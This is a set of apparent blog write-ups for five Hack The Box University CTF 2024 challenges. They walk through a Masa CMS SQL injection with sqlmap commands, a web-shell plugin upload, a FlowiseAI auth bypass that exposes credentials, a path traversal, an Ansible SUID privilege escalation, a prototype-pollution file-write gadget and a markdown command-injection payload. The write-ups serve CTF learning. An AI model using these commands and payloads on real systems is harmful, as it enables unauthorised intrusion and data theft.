[{"content":"Fullpwn - Freedom In these challenging times, the voices of freedom are growing fainter. Help us identify potential vulnerabilities in our systems so we can safeguard them against the Frontier Board, which seeks to silence any dissenting opinions. Allow up to 3 minutes for all the services to properly boot.\nUser Enumeration starting with port canning, we found that the machine are running Windows due to kerberos port (88) opened.\nWeb Application I started to enumerate web apps, which redirected into /index.cfm. cfm file extension are used for ColdFusion. there\u0026rsquo;s nothing much in the landing page, which then i decided to perform directory scan. Here i found several interesting results such as /README.md and /admin In the README.md files, i found that web application running Masa CMS if we try to open the /admin path, then we can also confirm that Masa CMS is being used. continuing with the directory scan, i found other interesting files named box.json. It seems like version 7.4.5 or Masa CMS is being used right now.\nMasaCMS Exploit After searching for known exploit of Masa CMS, i found this interesting article by projectdiscovery which disclose about pre-auth sql injection in Masa CMS version 7.4.5. Perfect!\nThey also provide attack scenario to obtain RCE in the Masa CMS as well. Based on the article, it seems like the Masa CMS are vulnerable to error-based SQL Injection. So i use sqlmap to dump the database.\n1 sqlmap \u0026#34;http://freedom.htb/index.cfm/_api/json/v1/default/?method=processAsyncObject\u0026amp;object=displayregion\u0026amp;contenthistid=x\u0026amp;previewID=x\u0026#34; -p contenthistid --level 5 --risk 3 --technique=E --prefix=\u0026#34;%5c\u0026#39;\u0026#34; --batch Alternatively, we can also view the database schema in the source code.\nIn order to achieve RCE, we need to reset user password. I use following command to dump user lists from database.\n1 sqlmap \u0026#34;http://freedom.htb/index.cfm/_api/json/v1/default/?method=processAsyncObject\u0026amp;object=displayregion\u0026amp;contenthistid=x\u0026amp;previewID=x\u0026#34; -p contenthistid --level 5 --risk 3 --technique=E --prefix=\u0026#34;x%5c\u0026#39;\u0026#34; --batch --dump -D dbMasaCMS -T tusers it seems like admin email was admin@freedom.htb\nusing the email address, we can invoke password reset from the /admin endpoint.\nAfter that, we need to obtain reset token and user id from database. We didn\u0026rsquo;t know where exactly the value is, and try to dump all table in dbMasaCMS database instead.\nAfter waiting for a while, we found interesting output within tredirects table.\nThe url can be used to reset admin password, nice!\nCrafting MuraCMS Plugin in order to obtain code execution, we need to upload our own plugin. This can be performed under Plugins \u0026gt; Add Plugin menu. I was lazy to create the plugin from scratch, so i decided to search for public available plugin, which i found from the MasaCMS repository itself\nI replace the content of MasaGoogleSitemaps-main\\admin\\views\\main\\default.cfm using backdoor shell from laudanum.\nThen i zip the plugin content and uploaded it. However, it shows error like this.\nFortunately, this error can be ignored. I just need to back to previous page and click for update button.\nVoila, plugin is uploaded! To access the plugin, click on it\u0026rsquo;s name This will redirect into /plugins/MasaGoogleSitemaps/ with forbidden result, what?? Luckily, we can remove the restriction by appending /index.cfm to the site. Shell is now opened, however we can\u0026rsquo;t see the content due to access restriction in the shell itself. We need to set X-Auth-Code header with value taken from the source code. Shell can be accessed now WSL Escape? When i execute whoami, it returning root instead of windows user?? I easily guess that this is probably wsl. Using mount command, i found that this is indeed an wsl intances that mounting drive C:\\ from windows. We can access windows file\u0026rsquo;s from it. User flag also can be obtained within /mnt/c/Users/j.bret/Desktop/user.txt\nFlag: HTB{c4n_y0u_pl34as3_cr4ck?}\nRoot well, this is weird. But we can also read root flag using wsl privileges lol\nroot flag located in /mnt/c/Users/Administrator/Desktop/root.txt\nFlag:HTB{l34ky_h4ndl3rs_4th3_w1n}\n","date":"2024-12-19T02:22:27.837Z","image":"https://blog.lordrukie.com/p/htb-ctf-university-2024-freedom/banner.jpg","permalink":"https://blog.lordrukie.com/p/htb-ctf-university-2024-freedom/","title":"[HTB CTF University 2024] - Freedom"},{"content":"Fullpwn - Apolo In the lawless expanse of the Frontier Cluster, Apolo serves as a beacon of security, working to safeguard the Frontier Clusterâ€™s assets from bounty hunters.\nUser Enumeration port scan showing two active port, 22 and 80.\nUsing curl, i managed to obtain server name, which is apolo.htb.\nWeb Application i add the domain name into /etc/hosts and starting to enumerate the web pages In one of the link, i found a subdomain ai.apolo.htb FlowiseAI Exploit I add the subdomain into /etc/hosts and starting to access the site. It seems like it use FlowiseAI. It seems that FlowiseAI have authentication bypass vulnerability.\nusing the technique mentioned on the exploitdb, i managed to bypsas authentication and obtain credentials id.\n1 2 3 4 5 6 7 8 9 [ { \u0026#34;id\u0026#34;: \u0026#34;6cfda83a-b055-4fd8-a040-57e5f1dae2eb\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;MongoDB\u0026#34;, \u0026#34;credentialName\u0026#34;: \u0026#34;mongoDBUrlApi\u0026#34;, \u0026#34;createdDate\u0026#34;: \u0026#34;2024-11-14T09:02:56.000Z\u0026#34;, \u0026#34;updatedDate\u0026#34;: \u0026#34;2024-11-14T09:02:56.000Z\u0026#34; } ] The id can be used to read the value of mongodb creds. 1 2 3 4 5 6 7 8 9 10 { \u0026#34;id\u0026#34;: \u0026#34;6cfda83a-b055-4fd8-a040-57e5f1dae2eb\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;MongoDB\u0026#34;, \u0026#34;credentialName\u0026#34;: \u0026#34;mongoDBUrlApi\u0026#34;, \u0026#34;createdDate\u0026#34;: \u0026#34;2024-11-14T09:02:56.000Z\u0026#34;, \u0026#34;updatedDate\u0026#34;: \u0026#34;2024-11-14T09:02:56.000Z\u0026#34;, \u0026#34;plainDataObj\u0026#34;: { \u0026#34;mongoDBConnectUrl\u0026#34;: \u0026#34;mongodb+srv://lewis:C0mpl3xi3Ty!_W1n3@cluster0.mongodb.net/myDatabase?retryWrites=true\u0026amp;w=majority\u0026#34; } } There\u0026rsquo;s pair of credentials there, which is lewis:C0mpl3xi3Ty!_W1n3.\nThe credentials can be used to logged in using ssh.\nFlag: HTB{llm_ex9l01t_4_RC3}\nRoot Our current user have permission to run rclone as root using sudo.\nUnfortunately, rclone is not listed in GTFOBins site Then i try to check for it\u0026rsquo;s docouomentation, and found that it have cat options that can be used to read files. I can easily read root flag using following command. Flag: HTB{cl0n3_rc3_f1l3}\n","date":"2024-12-19T02:16:44.843Z","image":"https://blog.lordrukie.com/p/htb-ctf-university-2024-apolo/banner.png","permalink":"https://blog.lordrukie.com/p/htb-ctf-university-2024-apolo/","title":"[HTB CTF University 2024] - Apolo"},{"content":"Fullpwn - Clouded In the lawless expanse of the Frontier Cluster, Clouded emerges as a beacon of efficiency and security for file sharing. Breakthrough their cloud servers to obtain the secrets to finding the Starry Spur. Allow up to 1 minute for all the services to properly boot.\nUser Enumeration Upon scanning the ports, we found that port 22 and 80 are open.\nwhen try to access the port 80, it was redirected into clouded.htb. We try to enumerate subdomain using ffuf command below, and found other subdomain named local.clouded.htb we add those two hostnames into /etc/hosts.\nWeb application The web page have several page, but the intersting one is Upload page. It allows user to upload several type of content. If we try to upload any content, it will return uploaded file location from local.clouded.htb subdomain. Cloud instances Using curl, i was able to identify that the site was hosted using aws, probably an s3 bucket I try to use aws-cli to enumerate the instances further, however i got permission denied i then try to enumerate further, started with directory enumration. I found that the application accept urlencoded form of ?. and after playing with other character, i noticed that the site also vulnerable to directory traversal, which allow me to bypass the restriction and access the bucket. it have file named backup.db which can be downloaded directly using link below http://local.clouded.htb/uploads/..%2F/clouded-internal/backup.db\nthe backup contains a lot of name and password in md5 format. SSH Bruteforce i managed to crack all the password and proceeding to create wordlists based on available information.\ni\u0026rsquo;ve tried multiple username combination based on username-anarchy. but in the end, the pair was simple. It was lastname:password.\nI managed to obtain correct credentials, which was nagato:alicia\nflag was located in /home/nagato/flag.txt\nRoot After obtaining low privilege user, i try to enumerate further. Aparently, nagato is part of frontiers group, which have access for /opt/infra-setup. It containing yml script, potentially used for healthcheck. If we try to monitor any process using pspy, then we can see that root user are running ansible using yml file mentioned before. ansible-playbook rce Using script from 0xdf, we can gain command execution using following yml code. Note that i made modification because i was lazy to setup reverse shell in my windows machine lol.\n1 2 3 4 - hosts: localhost tasks: - name: rev shell: bash -c \u0026#39;chmod u+s /bin/bash\u0026#39; since we dont have write permission into checkup.yml, we can\u0026rsquo;t modify the file directly. However since we have write permission on the directory itself, we can delete or rename the file into something else. This way, we can create new file with name of checkup.yml and inject the malicious script. After waiting for a while, the /bin/bash permission was modified into a SUID binary. Now we can obtain root shell by executing /bin/bash -p\nroot flag obtained! Flag: HTB{H@ZY_71ME5_AH3AD}\n","date":"2024-12-18T22:16:07+07:00","image":"https://blog.lordrukie.com/p/htb-ctf-university-2024-clouded/banner.png","permalink":"https://blog.lordrukie.com/p/htb-ctf-university-2024-clouded/","title":"[HTB CTF University 2024] - Clouded"},{"content":"Web - Intergalactic Bounty The Galactic Bounty Exchangeâ€”a system where hunters and hunted collide, controlled by the ruthless Frontier Board. Hidden within its encrypted core lies a prize of untold power: the bounty for the Starry Spur. To ignite rebellion, Jack Colt must infiltrate this fortress of contracts, manipulate its algorithms, and claim the Spurâ€™s bounty for himself. A race against time, a battle against the galaxyâ€™s deadliest systemâ€”Jackâ€™s mission will decide the fate of the Frontier.\nAnalaysis We are given nodejs application and email service with address of test@email.htb. The setup were pretty much like Armaxis.\nBased on the flag location in the source code, we need to obtain at least arbitrary file read or command execution in the application.\n1 COPY flag.txt / Bot Bot was found within the source code. It means there\u0026rsquo;s probably a client side vulnerability such as CSRF, XSS, and others.\nusing bot is the intended way to solve the challenge, however i\u0026rsquo;m using unintended solution to solve the problem\nEmail Discrepancy \u0026amp; Privilege Escalation In order to log in to the application, users need to register with the interstellar.htb domain. However, our accessible email domain is email.htb.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 const emailAddresses = require(\u0026#39;email-addresses\u0026#39;); const registerAPI = async (req, res) =\u0026gt; { const { email, password, role = \u0026#34;guest\u0026#34; } = req.body; const emailDomain = emailAddresses.parseOneAddress(email)?.domain; if (!emailDomain || emailDomain !== \u0026#39;interstellar.htb\u0026#39;) { return res.status(200).json({ message: \u0026#39;Registration is not allowed for this email domain\u0026#39; }); } try { await User.createUser(email, password, role); return res.json({ message: \u0026#34;User registered. Verification email sent.\u0026#34;, status: 201 }); } catch (err) { return res.status(500).json({ message: err.message, status: 500 }); } }; If email whitelist can be bypassed, we can register as admin due to parameter pollution in request parser.\n1 const { email, password, role = \u0026#34;guest\u0026#34; } = req.body; privilege escalation can be achieved using following request data upon registration.\n1 2 3 4 5 { \u0026#34;username\u0026#34;: \u0026#34;x\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;x\u0026#34;, \u0026#34;role\u0026#34;: \u0026#34;admin\u0026#34; } in order to beat the email parser, i try to read the documentation and source code of email-addresses, which i found several test cases of parseOneAddress successfull email format.\none of the interesting format is \u0026quot;FranÃ§oise LefÃ¨vre\u0026quot;@example.com.\nAfter playing with the format for a while, \u0026quot;test@email.htb test\u0026quot;@interstellar.htb was working perfectly!\nThis is because email parsing disrepancy between email-address and nodemailer. nodemailer will convert the email to following format, which will interpret test@interstellar.htb as a alias, and set test@email.htb as the email address.\nCode can be retrieved in the email Prototype Pollution in one of the admin feature, it uses mergedeep function. Usually, function related with merge in javascript environment is vulnerable to prototype pollution.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 const mergedeep = require(\u0026#34;@christopy/mergedeep\u0026#34;); const editBountiesAPI = async (req, res) =\u0026gt; { const { ...bountyData } = req.body; try { const data = await BountyModel.findByPk(req.params.id, { attributes: [ \u0026#34;target_name\u0026#34;, \u0026#34;target_aliases\u0026#34;, \u0026#34;target_species\u0026#34;, \u0026#34;last_known_location\u0026#34;, \u0026#34;galaxy\u0026#34;, \u0026#34;star_system\u0026#34;, \u0026#34;planet\u0026#34;, \u0026#34;coordinates\u0026#34;, \u0026#34;reward_credits\u0026#34;, \u0026#34;reward_items\u0026#34;, \u0026#34;issuer_name\u0026#34;, \u0026#34;issuer_faction\u0026#34;, \u0026#34;risk_level\u0026#34;, \u0026#34;required_equipment\u0026#34;, \u0026#34;posted_at\u0026#34;, \u0026#34;status\u0026#34;, \u0026#34;image\u0026#34;, \u0026#34;description\u0026#34;, \u0026#34;crimes\u0026#34;, \u0026#34;id\u0026#34;, ], }); if (!data) { return res.status(404).json({ message: \u0026#34;Bounty not found\u0026#34; }); } const updated = mergedeep(data.toJSON(), bountyData); await data.update(updated); return res.json(updated); } catch (err) { console.log(err); return res.status(500).json({ message: \u0026#34;Error fetching data\u0026#34; }); } }; if we take a look at the source code, it was clear that the library doesn\u0026rsquo;t prevent for prototype pollution and assign value directly into the target object.\nsimple payload such as {\u0026quot;__proto__\u0026quot;: {\u0026quot;test\u0026quot;:\u0026quot;yey\u0026quot;}} can be used to trigger the vulnerability.\nFinding Gadget Usually, prototype pollution in CTF are combined with child_process function such as fork, execSync, exec, etc. However there\u0026rsquo;s none of them in the current application.\nIn order to find gadget to obtain either arbitrary file read or command execution, i decided to explore all library used in the application.\nOne of the interesting library is needle\n1 2 3 4 5 6 7 { \u0026#34;dependencies\u0026#34;: { \u0026#34;@christopy/mergedeep\u0026#34;: \u0026#34;^1.0.4\u0026#34;, \u0026#34;lodash\u0026#34;: \u0026#34;^4.17.21\u0026#34;, \u0026#34;needle\u0026#34;: \u0026#34;^3.3.1\u0026#34; } } The library is used to fetch data from web service. The usage is definitely eye catching because most of nodejs application uses axios to fetch pages from internet. So there must be something in the needle library.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 const needle = require(\u0026#34;needle\u0026#34;); const fetchURL = async (url) =\u0026gt; { if (!url.startsWith(\u0026#34;http://\u0026#34;) \u0026amp;\u0026amp; !url.startsWith(\u0026#34;https://\u0026#34;)) { throw new Error(\u0026#34;Invalid URL: URL must start with http or https\u0026#34;); } const options = { compressed: true, follow_max: 0, }; return new Promise((resolve, reject) =\u0026gt; { needle.get(url, options, (err, resp, body) =\u0026gt; { if (err) { return reject(new Error(\u0026#34;Error fetching the URL: \u0026#34; + err.message)); } resolve(body); }); }); }; After reviewing the documentation and source code of needle, i found that output options is being used to save fetched content into system files.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 if (config.output \u0026amp;\u0026amp; resp.statusCode == 200) { // for some reason, simply piping resp to the writable stream doesn\u0026#39;t // work all the time (stream gets cut in the middle with no warning). // so we\u0026#39;ll manually need to do the readable/write(chunk) trick. var file = fs.createWriteStream(config.output); file.on(\u0026#39;error\u0026#39;, had_error); out.on(\u0026#39;end\u0026#39;, function() { if (file.writable) file.end(); }); file.on(\u0026#39;close\u0026#39;, function() { delete out.file; }) out.on(\u0026#39;readable\u0026#39;, function() { var chunk; while ((chunk = this.read()) !== null) { if (file.writable) file.write(chunk); // if callback was requested, also push it to resp.body if (resp.body) resp.body.push(chunk); } }) out.file = file; } so if we managed to pollute output options and call the fetchURL function, then we can perform arbitrary file write on the system.\nThis can be performed by calling /api/transmit using admin credentials after polluting the output options.\nafter obtaining arbitrary file write, we can try to\nOverwrite javascript files (need restart) Overwrite template files (without restart) DOS Additional bug, if we try to provide invalid url within fetchURL function, aparently the server will shut down.\nBecause the application using supervisord with autorestart=true, then this vulnerability can be used to restart the server after overwriting javascript files.\n1 2 3 4 5 6 7 8 9 [program:node] directory=/app command=node index.js autostart=true autorestart=true stdout_logfile=/dev/stdout stdout_logfile_maxbytes=0 stderr_logfile=/dev/stderr stderr_logfile_maxbytes=0 Exploitation in order to perform full attack, we need to:\nbypass email protection \u0026amp; privilege escalation perform prototype pollution to pollute output options overwrite either javascript or html files trigger the updated code to gain code execution perform the same step for remote, and flag can be obtained :D\nFlag: HTB{f1nd1ng_0d4y_15_345Y_r1gh7!!?_970db3ce5022cd532606efeca829916c}\n","date":"2024-12-18T11:09:50.476Z","image":"https://blog.lordrukie.com/p/htb-ctf-university-2024-intergalactic-bounty/banner.png","permalink":"https://blog.lordrukie.com/p/htb-ctf-university-2024-intergalactic-bounty/","title":"[HTB CTF University 2024] - Intergalactic Bounty"},{"content":"Web - Armaxis In the depths of the Frontier, Armaxis powers the enemyâ€™s dominance, dispatching weapons to crush rebellion. Fortified and hidden, it controls vital supply chains. Yet, a flaw whispers of opportunity, a crack to expose its secrets and disrupt their plans. Can you breach Armaxis and turn its power against tyranny?\nAnalysis We are given nodejs application and email service with address of test@wmail.htb.\nBased on the flag location in the source code, we need to at least obtain File Read or Code Execution within the application.\n1 COPY flag.txt /flag.txt After reading the source code, i found that parseMarkdown are using execSync with unsafe usage. This will allow us to obtain code execution if we manage to control the url value.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function parseMarkdown(content) { if (!content) return \u0026#39;\u0026#39;; return md.render( content.replace(/\\!\\[.*?\\]\\((.*?)\\)/g, (match, url) =\u0026gt; { try { const fileContent = execSync(`curl -s ${url}`); const base64Content = Buffer.from(fileContent).toString(\u0026#39;base64\u0026#39;); return `\u0026lt;img src=\u0026#34;data:image/*;base64,${base64Content}\u0026#34; alt=\u0026#34;Embedded Image\u0026#34;\u0026gt;`; } catch (err) { console.error(`Error fetching image from URL ${url}:`, err.message); return `\u0026lt;p\u0026gt;Error loading image: ${url}\u0026lt;/p\u0026gt;`; } }) ); } url value are obtain using regex, which will search for markdown image format such as:\n1 ![test](http://yooursite.com) this way, we can inject payload below to obtain code execution\n1 ![test](http://yooursite.com;id) parseMarkdown function was called within /weapons/dispath routes and only accessible for user with admin privileges.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 router.post(\u0026#34;/weapons/dispatch\u0026#34;, authenticate, async (req, res) =\u0026gt; { const { role } = req.user; if (role !== \u0026#34;admin\u0026#34;) return res.status(403).send(\u0026#34;Access denied.\u0026#34;); const { name, price, note, dispatched_to } = req.body; if (!name || !price || !note || !dispatched_to) { return res.status(400).send(\u0026#34;All fields are required.\u0026#34;); } try { const parsedNote = parseMarkdown(note); await dispatchWeapon(name, price, parsedNote, dispatched_to); res.send(\u0026#34;Weapon dispatched successfully.\u0026#34;); } catch (err) { console.error(\u0026#34;Error dispatching weapon:\u0026#34;, err); res.status(500).send(\u0026#34;Error dispatching weapon.\u0026#34;); } }); admin users were defined within database initialization below\n1 2 3 4 5 await runInsertUser( \u0026#34;admin@armaxis.htb\u0026#34;, `${crypto.randomBytes(69).toString(\u0026#34;hex\u0026#34;)}`, \u0026#34;admin\u0026#34;, ); To obtain admin credentials, we can perform an account takeover through the reset password feature. This feature allows users to reset their password using a token sent to their email. However, there is no validation to ensure that the token is assigned to the correct user. Additionally, we can supply any email address during the password reset process.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 router.post(\u0026#34;/reset-password/request\u0026#34;, async (req, res) =\u0026gt; { const { email } = req.body; if (!email) return res.status(400).send(\u0026#34;Email is required.\u0026#34;); try { const user = await getUserByEmail(email); if (!user) return res.status(404).send(\u0026#34;User not found.\u0026#34;); const resetToken = crypto.randomBytes(16).toString(\u0026#34;hex\u0026#34;); const expiresAt = Date.now() + 3600000; await createPasswordReset(user.id, resetToken, expiresAt); await transporter.sendMail({ from: \u0026#34;noreply@frontier.com\u0026#34;, to: email, subject: \u0026#34;Password Reset\u0026#34;, text: `Use this token to reset your password: ${resetToken}`, }); res.send(\u0026#34;Password reset token sent to your email.\u0026#34;); } catch (err) { console.error(\u0026#34;Error processing reset request:\u0026#34;, err); res.status(500).send(\u0026#34;Error processing reset request.\u0026#34;); } }); router.post(\u0026#34;/reset-password\u0026#34;, async (req, res) =\u0026gt; { const { token, newPassword, email } = req.body; // Added \u0026#39;email\u0026#39; parameter if (!token || !newPassword || !email) return res.status(400).send(\u0026#34;Token, email, and new password are required.\u0026#34;); try { const reset = await getPasswordReset(token); if (!reset) return res.status(400).send(\u0026#34;Invalid or expired token.\u0026#34;); const user = await getUserByEmail(email); if (!user) return res.status(404).send(\u0026#34;User not found.\u0026#34;); await updateUserPassword(user.id, newPassword); await deletePasswordReset(token); res.send(\u0026#34;Password reset successful.\u0026#34;); } catch (err) { console.error(\u0026#34;Error resetting password:\u0026#34;, err); res.status(500).send(\u0026#34;Error resetting password.\u0026#34;); } }); 1 2 3 4 5 6 7 8 9 async function getPasswordReset(token) { const query = `SELECT * FROM password_resets WHERE token = ? AND expires_at \u0026gt; ?`; try { const reset = await get(query, [token, Date.now()]); return reset; } catch (error) { throw error; } } Exploitation In order to takeover admin account, we need to:\nregister using test@email.htb perform reset password action obtain reset password token change email address upon form submission from test@email.htb into admin account admin@armaxis.htb now we can logged in into admin account the next step is to exploit code injection within dispatch weapon feature which will reflect in home page base64-decode the value will show the command output the last step is to read the flag in /flag.txt Flag : HTB{l00k0ut_f0r_m4rkd0wn_LF1_1n_w1ld!_ed3f0dc157df0cc33fc59f2854b4d9ee}\n","date":"2024-12-18T08:04:09.436Z","image":"https://blog.lordrukie.com/p/htb-ctf-university-2024-armaxis/banner.png","permalink":"https://blog.lordrukie.com/p/htb-ctf-university-2024-armaxis/","title":"[HTB CTF University 2024] - Armaxis"}]